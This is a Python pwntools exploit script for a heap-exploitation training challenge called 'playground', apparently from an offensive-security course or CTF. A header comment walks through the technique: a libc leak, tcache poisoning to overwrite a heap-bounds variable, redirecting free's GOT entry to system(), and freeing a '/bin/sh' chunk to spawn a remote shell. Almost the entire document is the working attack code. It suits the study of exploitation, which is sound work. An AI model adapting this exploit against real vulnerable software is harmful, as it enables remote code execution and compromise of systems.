from pwn import *

# First I allocate one big chunk, a small chunk and then I free the big one in order to leak a libc address (since
# it goes to the unsorted bin). I had to allocate a smaller chunk otherwise the big one went merged with the top chunk.
# After, I have to modify the min heap variable because it doesn't allow me to write out of the heap area.
# To do this, I use tcache poisoning by allocating two chunks and free them. Then I write in the last chunk I freed
# in order to overwrite the pointer with the address of the min_heap/max_heap variable. I allocate one chunk and I allocate
# another chunk which has the address of max heap variable in bss. In this way the min_heap variable is overwritten with
# zeros. Then with the write function I overwrite the .got address of free with the address of system() (since the magic gadgets
# don't work). After I allocate a chunk, writing inside the string /bin/sh. Then I use the free function (which its .got
# address is already overwritten with the one of system) to "free" the chunk previously allocated corresponding to 
# the string /bin/sh. In this way, free("/bin/sh") works as system("/bin/sh") and spawns a shell.


context.arch = 'amd64'

def malloc(p, size: int):
    p.sendline("malloc " + str(size))
    p.recvuntil(b"==> ")
    address = p.read(14)
    address = address[2::]
    p.recvuntil(b"> ")
    return address

def free(p, pointer):
    p.send(b"free 0x" + pointer + b"\n")
    p.recvuntil(b"> ")

def show(p, pointer, n: int):
    payload = b"show 0x" + pointer
    if(n != 0):
        payload += b" " + bytes(n)
    p.send(payload + b"\n")
    p.recvuntil(b": ")
    address = p.read(16)
    address = address.ljust(8, b"\x00")
    address = address[4::]
    p.recvuntil(b"> ")
    return address

def write(p, pointer, n, string: bytes):
    payload = b"write 0x" + pointer
    if(n != 0):
        payload += b" " + n
    p.send(payload + b"\n")
    p.recvuntil(b"==> read\n")
    p.send(string + b"\0")
    p.recvuntil(b"> ")

def final_free(p, pointer):
    p.send(b"free 0x" + pointer + b"\n")

#p = process("./playground")
p = remote("bin.training.offdef.it", 4110)

"""gdb.attach(p, '''
    b *main          
''')
input("wait")"""

OFFSET_GOT_FREE_MAIN = 11839  #the difference between the got address of free and the main
OFFSET_LIBC_BASE = 4111520 #the difference between the leak of libc and the base address of libc
ONE_GADGET = 0x10a2fc #one of the three magic gadgets tried but they don't work
OFFSET_SYSTEM_LIBC_BASE = 324640 #the difference between the system() function and the base address of libc
OFFSET_MAIN_MIN_HEAP = 11975 #the difference between the bss area with min_heap and the main address

p.recvuntil(b"main: ")
main_addr = p.read(14)
print(main_addr)

addr0 = malloc(p, 0x600)
addr1 = malloc(p, 50)
free(p, addr0)
libc_leak = show(p, addr0, 0)

addr2 = malloc(p, 50)
n_main_addr = int(main_addr, 16)
target = n_main_addr + OFFSET_MAIN_MIN_HEAP
target = p64(target)
free(p, addr1)
free(p, addr2)
write(p, addr2, b"9", target)
addr3 = malloc(p, 50)
addr4 = malloc(p, 50)

n_target_got = int(main_addr, 16) + OFFSET_GOT_FREE_MAIN
n_target_got = hex(n_target_got)[2::]
n_addr_to_write = int(libc_leak, 16) - OFFSET_LIBC_BASE + OFFSET_SYSTEM_LIBC_BASE
write(p, bytes(n_target_got, 'utf-8'), b"9", p64(n_addr_to_write))

addr5 = malloc(p, 0x60)
write(p, addr5, b"9", b"/bin/sh")
n_bin_sh = int(addr5, 16)
n_bin_sh = hex(n_bin_sh)[2::]
final_free(p, addr5)

p.interactive()